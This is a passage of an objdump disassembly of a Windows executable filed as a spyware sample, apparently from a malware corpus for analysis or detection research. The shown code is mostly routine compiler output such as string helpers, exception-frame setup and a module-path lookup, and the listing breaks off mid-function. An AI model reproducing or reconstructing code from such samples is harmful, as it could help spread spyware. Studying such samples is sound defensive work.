
malware_samples/spyware/0a711cc0e9a8c69b422e63e571966b0f2b86d62bd67f65c65a18c51496bb4fb0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	b8 03 00 00 00       	mov    $0x3,%eax
  401008:	5d                   	pop    %ebp
  401009:	c3                   	ret
  40100a:	cc                   	int3
  40100b:	cc                   	int3
  40100c:	cc                   	int3
  40100d:	cc                   	int3
  40100e:	cc                   	int3
  40100f:	cc                   	int3
  401010:	55                   	push   %ebp
  401011:	8b ec                	mov    %esp,%ebp
  401013:	51                   	push   %ecx
  401014:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401017:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40101a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40101d:	89 08                	mov    %ecx,(%eax)
  40101f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401022:	8b e5                	mov    %ebp,%esp
  401024:	5d                   	pop    %ebp
  401025:	c2 04 00             	ret    $0x4
  401028:	cc                   	int3
  401029:	cc                   	int3
  40102a:	cc                   	int3
  40102b:	cc                   	int3
  40102c:	cc                   	int3
  40102d:	cc                   	int3
  40102e:	cc                   	int3
  40102f:	cc                   	int3
  401030:	55                   	push   %ebp
  401031:	8b ec                	mov    %esp,%ebp
  401033:	83 ec 08             	sub    $0x8,%esp
  401036:	8b 45 08             	mov    0x8(%ebp),%eax
  401039:	50                   	push   %eax
  40103a:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  40103d:	e8 ce ff ff ff       	call   0x401010
  401042:	8b 08                	mov    (%eax),%ecx
  401044:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401047:	68 30 46 40 00       	push   $0x404630
  40104c:	8d 55 fc             	lea    -0x4(%ebp),%edx
  40104f:	52                   	push   %edx
  401050:	e8 05 28 00 00       	call   0x40385a
  401055:	8b e5                	mov    %ebp,%esp
  401057:	5d                   	pop    %ebp
  401058:	c2 04 00             	ret    $0x4
  40105b:	cc                   	int3
  40105c:	cc                   	int3
  40105d:	cc                   	int3
  40105e:	cc                   	int3
  40105f:	cc                   	int3
  401060:	55                   	push   %ebp
  401061:	8b ec                	mov    %esp,%ebp
  401063:	83 ec 14             	sub    $0x14,%esp
  401066:	8b 45 0c             	mov    0xc(%ebp),%eax
  401069:	50                   	push   %eax
  40106a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40106d:	51                   	push   %ecx
  40106e:	ff 15 04 40 40 00    	call   *0x404004
  401074:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401077:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  40107b:	75 07                	jne    0x401084
  40107d:	33 c0                	xor    %eax,%eax
  40107f:	e9 80 00 00 00       	jmp    0x401104
  401084:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401087:	52                   	push   %edx
  401088:	ff 15 14 40 40 00    	call   *0x404014
  40108e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401091:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401095:	75 04                	jne    0x40109b
  401097:	33 c0                	xor    %eax,%eax
  401099:	eb 69                	jmp    0x401104
  40109b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40109e:	50                   	push   %eax
  40109f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4010a2:	51                   	push   %ecx
  4010a3:	ff 15 10 40 40 00    	call   *0x404010
  4010a9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4010ac:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4010af:	03 55 f4             	add    -0xc(%ebp),%edx
  4010b2:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4010b5:	8b 45 10             	mov    0x10(%ebp),%eax
  4010b8:	83 e0 0f             	and    $0xf,%eax
  4010bb:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4010be:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  4010c2:	76 23                	jbe    0x4010e7
  4010c4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4010c7:	3b 4d f8             	cmp    -0x8(%ebp),%ecx
  4010ca:	73 1b                	jae    0x4010e7
  4010cc:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4010cf:	0f b7 02             	movzwl (%edx),%eax
  4010d2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4010d5:	8d 54 41 02          	lea    0x2(%ecx,%eax,2),%edx
  4010d9:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4010dc:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4010df:	83 e8 01             	sub    $0x1,%eax
  4010e2:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4010e5:	eb d7                	jmp    0x4010be
  4010e7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4010ea:	3b 4d f8             	cmp    -0x8(%ebp),%ecx
  4010ed:	72 04                	jb     0x4010f3
  4010ef:	33 c0                	xor    %eax,%eax
  4010f1:	eb 11                	jmp    0x401104
  4010f3:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4010f6:	0f b7 02             	movzwl (%edx),%eax
  4010f9:	85 c0                	test   %eax,%eax
  4010fb:	75 04                	jne    0x401101
  4010fd:	33 c0                	xor    %eax,%eax
  4010ff:	eb 03                	jmp    0x401104
  401101:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401104:	8b e5                	mov    %ebp,%esp
  401106:	5d                   	pop    %ebp
  401107:	c3                   	ret
  401108:	cc                   	int3
  401109:	cc                   	int3
  40110a:	cc                   	int3
  40110b:	cc                   	int3
  40110c:	cc                   	int3
  40110d:	cc                   	int3
  40110e:	cc                   	int3
  40110f:	cc                   	int3
  401110:	55                   	push   %ebp
  401111:	8b ec                	mov    %esp,%ebp
  401113:	51                   	push   %ecx
  401114:	6a 06                	push   $0x6
  401116:	8b 45 0c             	mov    0xc(%ebp),%eax
  401119:	c1 e8 04             	shr    $0x4,%eax
  40111c:	83 c0 01             	add    $0x1,%eax
  40111f:	0f b7 c8             	movzwl %ax,%ecx
  401122:	51                   	push   %ecx
  401123:	8b 55 08             	mov    0x8(%ebp),%edx
  401126:	52                   	push   %edx
  401127:	ff 15 00 40 40 00    	call   *0x404000
  40112d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401130:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401134:	75 04                	jne    0x40113a
  401136:	33 c0                	xor    %eax,%eax
  401138:	eb 14                	jmp    0x40114e
  40113a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40113d:	50                   	push   %eax
  40113e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401141:	51                   	push   %ecx
  401142:	8b 55 08             	mov    0x8(%ebp),%edx
  401145:	52                   	push   %edx
  401146:	e8 15 ff ff ff       	call   0x401060
  40114b:	83 c4 0c             	add    $0xc,%esp
  40114e:	8b e5                	mov    %ebp,%esp
  401150:	5d                   	pop    %ebp
  401151:	c3                   	ret
  401152:	cc                   	int3
  401153:	cc                   	int3
  401154:	cc                   	int3
  401155:	cc                   	int3
  401156:	cc                   	int3
  401157:	cc                   	int3
  401158:	cc                   	int3
  401159:	cc                   	int3
  40115a:	cc                   	int3
  40115b:	cc                   	int3
  40115c:	cc                   	int3
  40115d:	cc                   	int3
  40115e:	cc                   	int3
  40115f:	cc                   	int3
  401160:	55                   	push   %ebp
  401161:	8b ec                	mov    %esp,%ebp
  401163:	51                   	push   %ecx
  401164:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  401168:	50                   	push   %eax
  401169:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40116c:	c1 e9 04             	shr    $0x4,%ecx
  40116f:	83 c1 01             	add    $0x1,%ecx
  401172:	0f b7 d1             	movzwl %cx,%edx
  401175:	52                   	push   %edx
  401176:	6a 06                	push   $0x6
  401178:	8b 45 08             	mov    0x8(%ebp),%eax
  40117b:	50                   	push   %eax
  40117c:	ff 15 08 40 40 00    	call   *0x404008
  401182:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401185:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401189:	75 04                	jne    0x40118f
  40118b:	33 c0                	xor    %eax,%eax
  40118d:	eb 14                	jmp    0x4011a3
  40118f:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401192:	51                   	push   %ecx
  401193:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401196:	52                   	push   %edx
  401197:	8b 45 08             	mov    0x8(%ebp),%eax
  40119a:	50                   	push   %eax
  40119b:	e8 c0 fe ff ff       	call   0x401060
  4011a0:	83 c4 0c             	add    $0xc,%esp
  4011a3:	8b e5                	mov    %ebp,%esp
  4011a5:	5d                   	pop    %ebp
  4011a6:	c3                   	ret
  4011a7:	cc                   	int3
  4011a8:	cc                   	int3
  4011a9:	cc                   	int3
  4011aa:	cc                   	int3
  4011ab:	cc                   	int3
  4011ac:	cc                   	int3
  4011ad:	cc                   	int3
  4011ae:	cc                   	int3
  4011af:	cc                   	int3
  4011b0:	55                   	push   %ebp
  4011b1:	8b ec                	mov    %esp,%ebp
  4011b3:	83 ec 10             	sub    $0x10,%esp
  4011b6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4011bd:	6a 00                	push   $0x0
  4011bf:	b9 50 50 40 00       	mov    $0x405050,%ecx
  4011c4:	e8 27 1a 00 00       	call   0x402bf0
  4011c9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4011cc:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  4011d3:	eb 20                	jmp    0x4011f5
  4011d5:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4011d8:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4011db:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4011de:	51                   	push   %ecx
  4011df:	b9 50 50 40 00       	mov    $0x405050,%ecx
  4011e4:	e8 07 1a 00 00       	call   0x402bf0
  4011e9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4011ec:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4011ef:	83 c2 01             	add    $0x1,%edx
  4011f2:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4011f5:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4011f9:	74 2b                	je     0x401226
  4011fb:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4011ff:	75 25                	jne    0x401226
  401201:	0f b7 45 0c          	movzwl 0xc(%ebp),%eax
  401205:	50                   	push   %eax
  401206:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401209:	51                   	push   %ecx
  40120a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40120d:	52                   	push   %edx
  40120e:	e8 4d ff ff ff       	call   0x401160
  401213:	83 c4 0c             	add    $0xc,%esp
  401216:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401219:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40121d:	74 05                	je     0x401224
  40121f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401222:	eb 04                	jmp    0x401228
  401224:	eb af                	jmp    0x4011d5
  401226:	33 c0                	xor    %eax,%eax
  401228:	8b e5                	mov    %ebp,%esp
  40122a:	5d                   	pop    %ebp
  40122b:	c3                   	ret
  40122c:	cc                   	int3
  40122d:	cc                   	int3
  40122e:	cc                   	int3
  40122f:	cc                   	int3
  401230:	55                   	push   %ebp
  401231:	8b ec                	mov    %esp,%ebp
  401233:	51                   	push   %ecx
  401234:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401237:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40123a:	83 c0 10             	add    $0x10,%eax
  40123d:	8b e5                	mov    %ebp,%esp
  40123f:	5d                   	pop    %ebp
  401240:	c3                   	ret
  401241:	cc                   	int3
  401242:	cc                   	int3
  401243:	cc                   	int3
  401244:	cc                   	int3
  401245:	cc                   	int3
  401246:	cc                   	int3
  401247:	cc                   	int3
  401248:	cc                   	int3
  401249:	cc                   	int3
  40124a:	cc                   	int3
  40124b:	cc                   	int3
  40124c:	cc                   	int3
  40124d:	cc                   	int3
  40124e:	cc                   	int3
  40124f:	cc                   	int3
  401250:	55                   	push   %ebp
  401251:	8b ec                	mov    %esp,%ebp
  401253:	51                   	push   %ecx
  401254:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401257:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40125a:	83 c0 0c             	add    $0xc,%eax
  40125d:	b9 01 00 00 00       	mov    $0x1,%ecx
  401262:	f0 0f c1 08          	lock xadd %ecx,(%eax)
  401266:	8b e5                	mov    %ebp,%esp
  401268:	5d                   	pop    %ebp
  401269:	c3                   	ret
  40126a:	cc                   	int3
  40126b:	cc                   	int3
  40126c:	cc                   	int3
  40126d:	cc                   	int3
  40126e:	cc                   	int3
  40126f:	cc                   	int3
  401270:	55                   	push   %ebp
  401271:	8b ec                	mov    %esp,%ebp
  401273:	51                   	push   %ecx
  401274:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401277:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40127a:	33 c9                	xor    %ecx,%ecx
  40127c:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  401280:	0f 9c c1             	setl   %cl
  401283:	8a c1                	mov    %cl,%al
  401285:	8b e5                	mov    %ebp,%esp
  401287:	5d                   	pop    %ebp
  401288:	c3                   	ret
  401289:	cc                   	int3
  40128a:	cc                   	int3
  40128b:	cc                   	int3
  40128c:	cc                   	int3
  40128d:	cc                   	int3
  40128e:	cc                   	int3
  40128f:	cc                   	int3
  401290:	55                   	push   %ebp
  401291:	8b ec                	mov    %esp,%ebp
  401293:	51                   	push   %ecx
  401294:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401297:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40129a:	33 c9                	xor    %ecx,%ecx
  40129c:	83 78 0c 01          	cmpl   $0x1,0xc(%eax)
  4012a0:	0f 9f c1             	setg   %cl
  4012a3:	8a c1                	mov    %cl,%al
  4012a5:	8b e5                	mov    %ebp,%esp
  4012a7:	5d                   	pop    %ebp
  4012a8:	c3                   	ret
  4012a9:	cc                   	int3
  4012aa:	cc                   	int3
  4012ab:	cc                   	int3
  4012ac:	cc                   	int3
  4012ad:	cc                   	int3
  4012ae:	cc                   	int3
  4012af:	cc                   	int3
  4012b0:	55                   	push   %ebp
  4012b1:	8b ec                	mov    %esp,%ebp
  4012b3:	51                   	push   %ecx
  4012b4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4012b7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4012ba:	83 c0 0c             	add    $0xc,%eax
  4012bd:	83 c9 ff             	or     $0xffffffff,%ecx
  4012c0:	f0 0f c1 08          	lock xadd %ecx,(%eax)
  4012c4:	49                   	dec    %ecx
  4012c5:	85 c9                	test   %ecx,%ecx
  4012c7:	7f 17                	jg     0x4012e0
  4012c9:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4012cc:	52                   	push   %edx
  4012cd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4012d0:	8b 08                	mov    (%eax),%ecx
  4012d2:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4012d5:	8b 02                	mov    (%edx),%eax
  4012d7:	8b 11                	mov    (%ecx),%edx
  4012d9:	8b c8                	mov    %eax,%ecx
  4012db:	8b 42 04             	mov    0x4(%edx),%eax
  4012de:	ff d0                	call   *%eax
  4012e0:	8b e5                	mov    %ebp,%esp
  4012e2:	5d                   	pop    %ebp
  4012e3:	c3                   	ret
  4012e4:	cc                   	int3
  4012e5:	cc                   	int3
  4012e6:	cc                   	int3
  4012e7:	cc                   	int3
  4012e8:	cc                   	int3
  4012e9:	cc                   	int3
  4012ea:	cc                   	int3
  4012eb:	cc                   	int3
  4012ec:	cc                   	int3
  4012ed:	cc                   	int3
  4012ee:	cc                   	int3
  4012ef:	cc                   	int3
  4012f0:	55                   	push   %ebp
  4012f1:	8b ec                	mov    %esp,%ebp
  4012f3:	6a ff                	push   $0xffffffff
  4012f5:	68 01 39 40 00       	push   $0x403901
  4012fa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401300:	50                   	push   %eax
  401301:	83 ec 0c             	sub    $0xc,%esp
  401304:	a1 18 50 40 00       	mov    0x405018,%eax
  401309:	33 c5                	xor    %ebp,%eax
  40130b:	50                   	push   %eax
  40130c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40130f:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401315:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40131c:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40131f:	e8 bc 00 00 00       	call   0x4013e0
  401324:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40132b:	68 04 01 00 00       	push   $0x104
  401330:	68 04 01 00 00       	push   $0x104
  401335:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  401338:	e8 e3 02 00 00       	call   0x401620
  40133d:	50                   	push   %eax
  40133e:	6a 00                	push   $0x0
  401340:	ff 15 18 40 40 00    	call   *0x404018
  401346:	6a ff                	push   $0xffffffff
  401348:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40134b:	e8 f0 02 00 00       	call   0x401640
  401350:	6a 5c                	push   $0x5c
  401352:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  401355:	e8 b6 01 00 00       	call   0x401510
  40135a:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40135d:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  401361:	7d 29                	jge    0x40138c
  401363:	68 ea 41 40 00       	push   $0x4041ea
  401368:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40136b:	e8 d0 00 00 00       	call   0x401440
  401370:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401373:	83 c8 01             	or     $0x1,%eax
  401376:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401379:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  40137d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  401380:	e8 3b 01 00 00       	call   0x4014c0
  401385:	8b 45 08             	mov    0x8(%ebp),%eax
  401388:	eb 38                	jmp    0x4013c2
  40138a:	eb 2a                	jmp    0x4013b6
  40138c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40138f:	51                   	push   %ecx
  401390:	8b 55 08             	mov    0x8(%ebp),%edx
  401393:	52                   	push   %edx
  401394:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  401397:	e8 c4 01 00 00       	call   0x401560
  40139c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40139f:	83 c8 01             	or     $0x1,%eax
  4013a2:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4013a5:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  4013a9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4013ac:	e8 0f 01 00 00       	call   0x4014c0
  4013b1:	8b 45 08             	mov    0x8(%ebp),%eax
  4013b4:	eb 0c                	jmp    0x4013c2
  4013b6:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  4013ba:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4013bd:	e8 fe 00 00 00       	call   0x4014c0
  4013c2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4013c5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4013cc:	59                   	pop    %ecx
  4013cd:	8b e5                	mov    %ebp,%esp
  4013cf:	5d                   	pop    %ebp
  4013d0:	c3                   	ret
  4013d1:	cc                   	int3
  4013d2:	cc                   	int3
  4013d3:	cc                   	int3
  4013d4:	cc                   	int3
  4013d5:	cc                   	int3
  4013d6:	cc                   	int3
  4013d7:	cc                   	int3
  4013d8:	cc                   	int3
  4013d9:	cc                   	int3
  4013da:	cc                   	int3
  4013db:	cc                   	int3
  4013dc:	cc                   	int3
  4013dd:	cc                   	int3
  4013de:	cc                   	int3
  4013df:	cc                   	int3
  4013e0:	55                   	push   %ebp
  4013e1:	8b ec                	mov    %esp,%ebp
  4013e3:	6a ff                	push   $0xffffffff
  4013e5:	68 78 38 40 00       	push   $0x403878
  4013ea:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4013f0:	50                   	push   %eax
  4013f1:	51                   	push   %ecx
  4013f2:	a1 18 50 40 00       	mov    0x405018,%eax
  4013f7:	33 c5                	xor    %ebp,%eax
  4013f9:	50                   	push   %eax
  4013fa:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4013fd:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401403:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401406:	e8 75 05 00 00       	call   0x401980
  40140b:	50                   	push   %eax
  40140c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40140f:	e8 ec 03 00 00       	call   0x401800
  401414:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40141b:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401422:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401425:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401428:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40142f:	59                   	pop    %ecx
  401430:	8b e5                	mov    %ebp,%esp
  401432:	5d                   	pop    %ebp
  401433:	c3                   	ret
  401434:	cc                   	int3
  401435:	cc                   	int3
  401436:	cc                   	int3
  401437:	cc                   	int3
  401438:	cc                   	int3
  401439:	cc                   	int3
  40143a:	cc                   	int3
  40143b:	cc                   	int3
  40143c:	cc                   	int3
  40143d:	cc                   	int3
  40143e:	cc                   	int3
  40143f:	cc                   	int3
  401440:	55                   	push   %ebp
  401441:	8b ec                	mov    %esp,%ebp
  401443:	6a ff                	push   $0xffffffff
  401445:	68 78 38 40 00       	push   $0x403878
  40144a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401450:	50                   	push   %eax
  401451:	51                   	push   %ecx
  401452:	a1 18 50 40 00       	mov    0x405018,%eax
  401457:	33 c5                	xor    %ebp,%eax
  401459:	50                   	push   %eax
  40145a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40145d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401463:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401466:	e8 15 05 00 00       	call   0x401980
  40146b:	50                   	push   %eax
  40146c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40146f:	e8 8c 03 00 00       	call   0x401800
  401474:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40147b:	8b 45 08             	mov    0x8(%ebp),%eax
  40147e:	50                   	push   %eax
  40147f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401482:	e8 29 03 00 00       	call   0x4017b0
  401487:	0f b6 c8             	movzbl %al,%ecx
  40148a:	85 c9                	test   %ecx,%ecx
  40148c:	75 0c                	jne    0x40149a
  40148e:	8b 55 08             	mov    0x8(%ebp),%edx
  401491:	52                   	push   %edx
  401492:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401495:	e8 b6 02 00 00       	call   0x401750
  40149a:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4014a1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4014a4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4014a7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4014ae:	59                   	pop    %ecx
  4014af:	8b e5                	mov    %ebp,%esp
  4014b1:	5d                   	pop    %ebp
  4014b2:	c2 04 00             	ret    $0x4
  4014b5:	cc                   	int3
  4014b6:	cc                   	int3
  4014b7:	cc                   	int3
  4014b8:	cc                   	int3
  4014b9:	cc                   	int3
  4014ba:	cc                   	int3
  4014bb:	cc                   	int3
  4014bc:	cc                   	int3
  4014bd:	cc                   	int3
  4014be:	cc                   	int3
  4014bf:	cc                   	int3
  4014c0:	55                   	push   %ebp
  4014c1:	8b ec                	mov    %esp,%ebp
  4014c3:	6a ff                	push   $0xffffffff
  4014c5:	68 78 38 40 00       	push   $0x403878
  4014ca:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4014d0:	50                   	push   %eax
  4014d1:	51                   	push   %ecx
  4014d2:	a1 18 50 40 00       	mov    0x405018,%eax
  4014d7:	33 c5                	xor    %ebp,%eax
  4014d9:	50                   	push   %eax
  4014da:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4014dd:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4014e3:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4014e6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4014ed:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4014f4:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4014f7:	e8 54 03 00 00       	call   0x401850
  4014fc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4014ff:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401506:	59                   	pop    %ecx
  401507:	8b e5                	mov    %ebp,%esp
  401509:	5d                   	pop    %ebp
  40150a:	c3                   	ret
  40150b:	cc                   	int3
  40150c:	cc                   	int3
  40150d:	cc                   	int3
  40150e:	cc                   	int3
  40150f:	cc                   	int3
  401510:	55                   	push   %ebp
  401511:	8b ec                	mov    %esp,%ebp
  401513:	83 ec 0c             	sub    $0xc,%esp
  401516:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401519:	0f b6 45 08          	movzbl 0x8(%ebp),%eax
  40151d:	50                   	push   %eax
  40151e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401521:	e8 6a 03 00 00       	call   0x401890
  401526:	50                   	push   %eax
  401527:	e8 64 04 00 00       	call   0x401990
  40152c:	83 c4 08             	add    $0x8,%esp
  40152f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401532:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401536:	75 09                	jne    0x401541
  401538:	c7 45 f4 ff ff ff ff 	movl   $0xffffffff,-0xc(%ebp)
  40153f:	eb 10                	jmp    0x401551
  401541:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401544:	e8 47 03 00 00       	call   0x401890
  401549:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40154c:	2b c8                	sub    %eax,%ecx
  40154e:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401551:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401554:	8b e5                	mov    %ebp,%esp
  401556:	5d                   	pop    %ebp
  401557:	c2 04 00             	ret    $0x4
  40155a:	cc                   	int3
  40155b:	cc                   	int3
  40155c:	cc                   	int3
  40155d:	cc                   	int3
  40155e:	cc                   	int3
  40155f:	cc                   	int3
  401560:	55                   	push   %ebp
  401561:	8b ec                	mov    %esp,%ebp
  401563:	6a ff                	push   $0xffffffff
  401565:	68 b9 38 40 00       	push   $0x4038b9
  40156a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401570:	50                   	push   %eax
  401571:	83 ec 0c             	sub    $0xc,%esp
  401574:	a1 18 50 40 00       	mov    0x405018,%eax
  401579:	33 c5                	xor    %ebp,%eax
  40157b:	50                   	push   %eax
  40157c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40157f:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401585:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  401588:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40158f:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  401593:	7d 07                	jge    0x40159c
  401595:	c7 45 0c 00 00 00 00 	movl   $0x0,0xc(%ebp)
  40159c:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40159f:	e8 cc 02 00 00       	call   0x401870
  4015a4:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4015a7:	8b 45 0c             	mov    0xc(%ebp),%eax
  4015aa:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  4015ad:	7c 21                	jl     0x4015d0
  4015af:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4015b2:	51                   	push   %ecx
  4015b3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4015b6:	e8 d5 00 00 00       	call   0x401690
  4015bb:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4015c2:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4015c5:	83 ca 01             	or     $0x1,%edx
  4015c8:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4015cb:	8b 45 08             	mov    0x8(%ebp),%eax
  4015ce:	eb 31                	jmp    0x401601
  4015d0:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4015d3:	e8 98 01 00 00       	call   0x401770
  4015d8:	50                   	push   %eax
  4015d9:	8b 45 0c             	mov    0xc(%ebp),%eax
  4015dc:	50                   	push   %eax
  4015dd:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4015e0:	e8 ab 02 00 00       	call   0x401890
  4015e5:	50                   	push   %eax
  4015e6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4015e9:	e8 02 01 00 00       	call   0x4016f0
  4015ee:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4015f5:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4015f8:	83 c9 01             	or     $0x1,%ecx
  4015fb:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4015fe:	8b 45 08             	mov    0x8(%ebp),%eax
  401601:	8b 4d f4             	mov    -0xc(%ebp),%ecx
